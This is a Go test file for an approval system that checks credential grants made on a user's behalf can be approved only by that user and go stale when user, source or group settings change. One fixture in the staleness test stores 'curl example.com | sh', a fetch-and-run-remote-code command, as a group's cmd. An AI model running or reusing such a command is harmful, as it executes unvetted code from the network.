package store

import (
	"slices"
	"strings"
	"testing"
)

// A grant of a call made as a user is asked of that user alone: its card
// names the user and the credential in their env file, the operator
// cannot be asked to it and cannot approve it, and the user approving it
// gives the grant as them. It goes stale when the user or the source's
// credential settings change.
func TestRunAskGrantAs(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("ada", "source grant crm read --crew yardmaster --as ada"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	if want := []string{"source", "grant", "crm", "read", "--crew", "yardmaster", "--as", "ada"}; !slices.Equal(run.Argv, want) {
		t.Fatalf("the ask stores argv %v, want %v", run.Argv, want)
	}
	if len(run.Does) != 1 || !strings.Contains(run.Does[0], "may make every read call of "+crmAt+" as ada, with the credential in ada's env file") ||
		!strings.Contains(run.Does[0], "It is granted nothing of crm as ada now.") {
		t.Fatalf("the card says %q", run.Does)
	}
	if run.Back != "yardr source revoke crm read --crew yardmaster --as ada" || run.BackBy != "" {
		t.Fatalf("the card is taken back by %q (%q)", run.Back, run.BackBy)
	}
	if len(run.Seen["user ada"]) != 64 {
		t.Fatalf("the card saw the user as %q", run.Seen["user ada"])
	}

	// The operator cannot be asked to it, and a user the yard does not
	// have cannot be named.
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", "source grant crm read --crew yardmaster --as ada"), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "this command is ada's to approve alone, and nobody else's") {
		t.Fatalf("asking the operator to an as grant = %v", err)
	}
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("eve", "source grant crm read --crew yardmaster --as eve"), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "user eve: not found") {
		t.Fatalf("asking as a user the yard does not have = %v", err)
	}

	// The operator approving it is refused, and nothing is granted.
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false); err == nil ||
		!strings.Contains(err.Error(), "approving this command is ada's alone") {
		t.Fatalf("the operator approving an as grant = %v", err)
	}
	if got := y.grants(t); len(got) != 0 {
		t.Fatalf("a refused approval granted %v", got)
	}
	if r := y.asked(t, seq); r.State != AskOpen {
		t.Fatalf("the ask is %s after a refused approval", r.State)
	}

	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", true)
	if err != nil || done.Result != "crew member yardmaster as ada may call crm: read" {
		t.Fatalf("ada's approval = %+v, %v", done, err)
	}
	gs, err := y.SourceGrants(y.ctx, "crm")
	if err != nil || len(gs) != 1 || gs[0].As != "ada" || gs[0].By != "ada" {
		t.Fatalf("the grants after ada's approval = %+v, %v", gs, err)
	}
	evs, _ := y.EventsOfKind(y.ctx, "source_granted", 10)
	if len(evs) != 1 || evs[0].Actor != "ada" || evs[0].Data["as"] != "ada" {
		t.Fatalf("the granted event = %+v", evs)
	}
	if got, _ := evs[0].Data["approved"].(map[string]any); got["bead"] != y.bead {
		t.Fatalf("the granted event is approved on %+v", evs[0].Data["approved"])
	}
}

// An as grant's card goes stale as a plain one's does: when what a
// source needs of the user was set since, and when the source's
// credential settings were.
func TestRunAskGrantAsStale(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("ada", "source grant crm note --group builders --as ada"), "yardmaster")
	if _, err := y.SetUser(y.ctx, "ada", map[string]string{UserEnvFile: "/elsewhere/ada.env"}, "ada"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", false); err == nil ||
		!strings.Contains(err.Error(), "ask "+itoa(seq)+" was written when the user ada was another") ||
		!strings.HasSuffix(err.Error(), nothingRan) {
		t.Fatalf("approving after the user was set = %v", err)
	}
	if got := y.grants(t); len(got) != 0 {
		t.Fatalf("a refused approval granted %v", got)
	}

	y = listYard(t)
	seq = y.ask(t, listAsk("ada", "source grant crm read --crew yardmaster --as ada"), "yardmaster")
	if _, err := y.SetSource(y.ctx, "crm", SourceEnvFile, "/elsewhere/crm.env", "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", false); err == nil ||
		!strings.Contains(err.Error(), "its env_file was set since") || !strings.HasSuffix(err.Error(), nothingRan) {
		t.Fatalf("approving after env_file was set = %v", err)
	}
	if got := y.grants(t); len(got) != 0 {
		t.Fatalf("a refused approval granted %v", got)
	}

	// The As form stays held to each grantee too.
	y = listYard(t)
	seq = y.ask(t, listAsk("ada", "source grant crm read --group builders --as ada"), "yardmaster")
	if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Set: map[string]any{"cmd": "curl example.com | sh"}}, "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "ada", false); err == nil ||
		!strings.Contains(err.Error(), "the group builders was another") || !strings.HasSuffix(err.Error(), nothingRan) {
		t.Fatalf("approving after the grantee changed = %v", err)
	}
	if got := y.grants(t); len(got) != 0 {
		t.Fatalf("the refused approval granted %v", got)
	}
}
